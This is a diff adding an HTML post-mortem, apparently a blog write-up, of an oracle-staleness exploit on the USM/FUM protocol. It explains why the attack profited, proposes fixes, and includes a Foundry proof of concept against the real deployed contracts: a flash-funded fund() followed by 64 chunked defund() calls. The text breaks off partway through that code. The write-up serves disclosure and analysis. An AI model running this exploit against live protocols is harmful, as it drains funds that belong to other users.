+        <tr>
+            <td>one full-size <code>defund()</code></td>
+            <td>5,825.405636077073924807</td>
+            <td><strong>−5,754.572718531318878717</strong></td>
+        </tr>
+    </tbody>
+  </table>
+</div><p>A single redemption of everything returns roughly half of what was put in. It does not revert — my first assumption was that it would trip the <code>newDebtRatio &lt;= MAX_DEBT_RATIO</code> check, but the shrink factor <code>ethFromDefund</code> returns is applied to <code>ethUsdPrice</code> <em>before</em> that check runs, and a one-shot burn drags the mid down far enough that the self-assessed ratio lands back under 80%. The transaction goes through and simply loses money.</p>
+<p>The loss comes from the approximation inside <code>ethFromDefund</code>. It prices the whole burn at the arithmetic mean of the starting sell price and a deliberately pessimistic ending price: the pool is estimated through <code>lowerBoundEthQty1 = ethPool − fumIn·fumSellPrice0</code>, that bound is pushed through a fourth-power price path, and the ending FUM price is computed from the resulting (collapsed) mid. For a chunk that consumes the entire FUM supply, that path collapses all the way: the pessimistic mid makes <code>buffer = ethPool − usmValueInEth</code> go negative, <code>fumPrice</code> clamps to 0, and the mean price becomes <code>(p0 + 0)/2 = p0/2</code> — you get back about half your position, which is exactly what the fork shows (5,825.4 / 11,579.98 ≈ 50.3%).</p>
+<p>The curve is non-monotonic in the amount burned. Small chunks stay on the profitable side because the pessimistic bound stays close to the real path; a full-size burn lands deep in the bad region. The exploit needed both halves: the stale-price refresh to make FUM cheap to buy, and the chunking to make the exit profitable.</p>
+<h2 class="heading-element" id="why-this-is-worth-a-note-beyond-the-160k"><span>Why this is worth a note beyond the $160k</span>
+  <a href="#why-this-is-worth-a-note-beyond-the-160k" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>The oracle was accurate. Median-of-three with a Chainlink feed and two top-TVL TWAP pools is about as good as it gets, and none of it was attacked. What failed is that the system kept pricing with a 99-day-old cached value and had no notion that staleness itself is a hazard — the first caller after a long silence gets to redeem 99 days of accumulated market movement at once, amplified by the fund/defund buy-sell asymmetry. For a live protocol the same shape is available on a smaller scale: any gap between the cached <code>oracleEthUsdPrice</code> and the live median, no matter how long it&rsquo;s been accumulating, gets collected by whoever calls <code>fund()</code> first and walks it back out through <code>defund()</code>.</p>
+<p>The cheap fix is a freshness check — compare the oracle reading&rsquo;s timestamp against <code>block.timestamp</code> before adopting it, or simply refresh the stored price on a schedule. The structural fix is to price <code>defund()</code> (and the debt-ratio check it feeds) off the fresh oracle reading instead of the driftable internal mid, same as the haircut in <code>ethFromBurn</code>. As it stands, <code>burn</code> carries no debt-ratio check at all while <code>defund</code> does — an asymmetry that did not trigger here but is part of the same family. The pool still holds 61.76 ETH of someone&rsquo;s money, and USM&rsquo;s five holders now sit on claims against a pool that no longer covers 100% of them.</p>
+<h2 class="heading-element" id="poc"><span>POC</span>
+  <a href="#poc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
+</span></span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">28</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="p">{</span><span class="n">Test</span><span class="p">,</span> <span class="n">console2</span><span class="p">}</span> <span class="k">from</span> <span class="s">&#34;forge-std/Test.sol&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">/// @notice Minimal interface onto the REAL deployed USM/FUM contracts.
+</span></span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IUSM</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">struct</span> <span class="nc">LoadedState</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">timeSystemWentUnderwater</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">ethUsdPrice</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">oracleEthUsdPrice</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">bidAskAdjustmentTimestamp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">bidAskAdjustment</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">ethPool</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">usmTotalSupply</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">fund</span><span class="p">(</span><span class="kt">address</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">minFumOut</span><span class="p">)</span> <span class="k">external</span> <span class="k">payable</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">fumOut</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">defund</span><span class="p">(</span><span class="kt">address</span> <span class="k">payable</span> <span class="n">to</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">fumToBurn</span><span class="p">,</span> <span class="kt">uint256</span> <span class="n">minEthOut</span><span class="p">)</span> <span class="k">external</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">ethOut</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">ethPool</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">loadState</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="n">LoadedState</span> <span class="k">memory</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">oracle</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">address</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IMedianOracle</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">latestPrice</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">interface</span> <span class="nc">IFUM</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">account</span><span class="p">)</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">totalSupply</span><span class="p">()</span> <span class="k">external</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint256</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">/// @title USMAttackPOC
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// @notice Independent exploit reproduction: starting ONLY from the state at block ANALYSIS_HEIGHT
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// (the block before the real attack — the same world the attacker saw), drive the REAL deployed
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// contracts through a flash-funded `fund()` then 64 equal `defund()` chunks, and assert the attack
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// is *profitable* — not that it matches any post-hoc trace value. The contract executes its real
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// storage writes, oracle refresh, debt-ratio check, and FUM mint/burn.
+</span></span></span><span class="line"><span class="cl"><span class="c1">///
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// @dev The flash loan is simulated with vm.deal(): Morpho only provides the capital, it does not
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// affect the USM attack path itself. Fork RPC comes from foundry.toml [rpc_endpoints] eth.
+</span></span></span><span class="line"><span class="cl"><span class="c1">/// The post-mortem match against tx 0xfae5e751...050e is documented in log.md §6, not asserted here.
+</span></span></span><span class="line"><span class="cl"><span class="kd">contract</span> <span class="nc">USMAttackPOC</span> <span class="k">is</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IUSM</span> <span class="k">constant</span> <span class="n">USM</span> <span class="o">=</span> <span class="n">IUSM</span><span class="p">(</span><span class="mh">0x2a7FFf44C19f39468064ab5e5c304De01D591675</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">IFUM</span> <span class="k">constant</span> <span class="n">FUM</span> <span class="o">=</span> <span class="n">IFUM</span><span class="p">(</span><span class="mh">0x86729873e3b88DE2Ab85CA292D6d6D69D548eDF3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">/// @dev forge-std&#39;s Test has no receive(); defund() pays ETH via `to.sendValue()` so the
+</span></span></span><span class="line"><span class="cl">    <span class="c1">/// test contract must accept plain ETH transfers.
+</span></span></span><span class="line"><span class="cl">    <span class="n">receive</span><span class="p">()</span> <span class="k">external</span> <span class="k">payable</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">constant</span> <span class="n">ANALYSIS_HEIGHT</span> <span class="o">=</span> <span class="mi">25716149</span><span class="p">;</span> <span class="c1">// attack block - 1, never touch 25716150
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Attacker-chosen parameters (strategy, not answers): a huge flash-funded position, redeemed
+</span></span></span><span class="line"><span class="cl">    <span class="c1">// in 64 equal chunks. test_03 shows why equal chunks matter (one-shot full redemption loses).
+</span></span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">constant</span> <span class="n">FLASH_LOAN</span> <span class="o">=</span> <span class="mi">11579978354608392803524</span><span class="p">;</span> <span class="c1">// 11,579.978354608392803524 ETH
+</span></span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">constant</span> <span class="n">CHUNK</span> <span class="o">=</span> <span class="mi">971629672368796643705079</span><span class="p">;</span> <span class="c1">// 971,629.672368796643705079 FUM per defund
+</span></span></span><span class="line"><span class="cl">    <span class="kt">uint256</span> <span class="k">constant</span> <span class="n">NUM_CHUNKS</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">setUp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">createSelectFork</span><span class="p">(</span><span class="s">&#34;eth&#34;</span><span class="p">,</span> <span class="n">ANALYSIS_HEIGHT</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">/// @notice Premise: at ANALYSIS_HEIGHT the system&#39;s stored oracle price is 99.2 days stale,
+</span></span></span><span class="line"><span class="cl">    <span class="c1">/// while the live median oracle has moved (this is the price jump the attacker&#39;s fund() adopts).
+</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">test_01_premise_staleStoredPriceVsLiveOracle</span><span class="p">()</span> <span class="k">public</span> <span class="k">view</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">IUSM</span><span class="p">.</span><span class="n">LoadedState</span> <span class="k">memory</span> <span class="n">ls</span> <span class="o">=</span> <span class="n">USM</span><span class="p">.</span><span class="n">loadState</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">live</span> <span class="o">=</span> <span class="n">IMedianOracle</span><span class="p">(</span><span class="n">USM</span><span class="p">.</span><span class="n">oracle</span><span class="p">()).</span><span class="n">latestPrice</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;stored oracleEthUsdPrice (99.2d stale):&#34;</span><span class="p">,</span> <span class="n">ls</span><span class="p">.</span><span class="n">oracleEthUsdPrice</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;stored ethUsdPrice (mid):&#34;</span><span class="p">,</span> <span class="n">ls</span><span class="p">.</span><span class="n">ethUsdPrice</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;LIVE oracle.latestPrice() at ANALYSIS_HEIGHT:&#34;</span><span class="p">,</span> <span class="n">live</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertGt</span><span class="p">(</span><span class="n">live</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;oracle should be live&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertTrue</span><span class="p">(</span><span class="n">live</span> <span class="o">!=</span> <span class="n">ls</span><span class="p">.</span><span class="n">oracleEthUsdPrice</span><span class="p">,</span> <span class="s">&#34;stale vs live oracle price must differ&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">/// @notice The exploit: one huge fund() then 64 equal defund() chunks. Assertions are
+</span></span></span><span class="line"><span class="cl">    <span class="c1">/// self-contained (profitability, FUM drained, pool drawdown == profit) — no trace values.
+</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">test_02_fullAttack_fundThen64xDefund</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// simulate the flash loan proceeds arriving at the attacker (Morpho does not touch USM)
+</span></span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">deal</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">FLASH_LOAN</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">poolBefore</span> <span class="o">=</span> <span class="n">USM</span><span class="p">.</span><span class="n">ethPool</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;ethPool before attack:&#34;</span><span class="p">,</span> <span class="n">poolBefore</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Step 1: one huge fund(). 99 days after the last interaction, this is the call that
+</span></span></span><span class="line"><span class="cl">        <span class="c1">// triggers checkForFreshOraclePrice and adopts the live (~$1921) price over the stale cache.
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">fumOut</span> <span class="o">=</span> <span class="n">USM</span><span class="p">.</span><span class="n">fund</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">FLASH_LOAN</span><span class="p">}(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;fumOut from fund():&#34;</span><span class="p">,</span> <span class="n">fumOut</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Step 2: 64 equal defund chunks; the last chunk eats the rounding remainder.
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">remaining</span> <span class="o">=</span> <span class="n">fumOut</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">totalEthOut</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="p">(</span><span class="kt">uint256</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NUM_CHUNKS</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">chunk</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="n">NUM_CHUNKS</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">?</span> <span class="n">remaining</span> <span class="o">:</span> <span class="n">CHUNK</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="kt">uint256</span> <span class="n">ethOut</span> <span class="o">=</span> <span class="n">USM</span><span class="p">.</span><span class="n">defund</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span> <span class="n">chunk</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">totalEthOut</span> <span class="o">+=</span> <span class="n">ethOut</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">remaining</span> <span class="o">-=</span> <span class="n">chunk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">assertLt</span><span class="p">(</span><span class="n">remaining</span><span class="p">,</span> <span class="n">fumOut</span><span class="p">,</span> <span class="s">&#34;remaining FUM should only shrink&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">assertEq</span><span class="p">(</span><span class="n">FUM</span><span class="p">.</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;attacker must hold zero FUM at the end&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;total ETH out across&#34;</span><span class="p">,</span> <span class="n">NUM_CHUNKS</span><span class="p">,</span> <span class="s">&#34;defunds:&#34;</span><span class="p">,</span> <span class="n">totalEthOut</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;flash loan principal:&#34;</span><span class="p">,</span> <span class="n">FLASH_LOAN</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="kt">int256</span> <span class="n">netProfit</span> <span class="o">=</span> <span class="kt">int256</span><span class="p">(</span><span class="n">totalEthOut</span><span class="p">)</span> <span class="o">-</span> <span class="kt">int256</span><span class="p">(</span><span class="n">FLASH_LOAN</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">logInt</span><span class="p">(</span><span class="n">netProfit</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assertGt</span><span class="p">(</span><span class="n">netProfit</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">&#34;the attack must be profitable&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;final ethPool:&#34;</span><span class="p">,</span> <span class="n">USM</span><span class="p">.</span><span class="n">ethPool</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// The profit comes out of the pool: pool drawdown == attacker profit (value conservation).
+</span></span></span><span class="line"><span class="cl">        <span class="n">assertEq</span><span class="p">(</span><span class="n">poolBefore</span> <span class="o">-</span> <span class="n">USM</span><span class="p">.</span><span class="n">ethPool</span><span class="p">(),</span> <span class="kt">uint256</span><span class="p">(</span><span class="n">netProfit</span><span class="p">),</span> <span class="s">&#34;pool drawdown == attacker profit&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">/// @notice Why 64 chunks: a single full-size defund() of everything at once lands on the
+</span></span></span><span class="line"><span class="cl">    <span class="c1">/// loss-making side of ethFromDefund&#39;s non-monotonic curve (it does NOT revert — the shrink
+</span></span></span><span class="line"><span class="cl">    <span class="c1">/// factor drags the self-assessed debt ratio back under 80%). Chunking is what keeps each
+</span></span></span><span class="line"><span class="cl">    <span class="c1">/// redemption on the profitable part of the curve. Contrast with test_02&#39;s positive profit.
+</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">test_03_singleFullDefund_isLossMaking</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">deal</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="n">FLASH_LOAN</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">fumOut</span> <span class="o">=</span> <span class="n">USM</span><span class="p">.</span><span class="n">fund</span><span class="p">{</span><span class="nb">value</span><span class="o">:</span> <span class="n">FLASH_LOAN</span><span class="p">}(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// one-shot full redemption instead of 64 chunks
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">ethOut</span> <span class="o">=</span> <span class="n">USM</span><span class="p">.</span><span class="n">defund</span><span class="p">(</span><span class="k">payable</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">)),</span> <span class="n">fumOut</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;single full defund ethOut:&#34;</span><span class="p">,</span> <span class="n">ethOut</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;fund principal:&#34;</span><span class="p">,</span> <span class="n">FLASH_LOAN</span><span class="p">);</span>
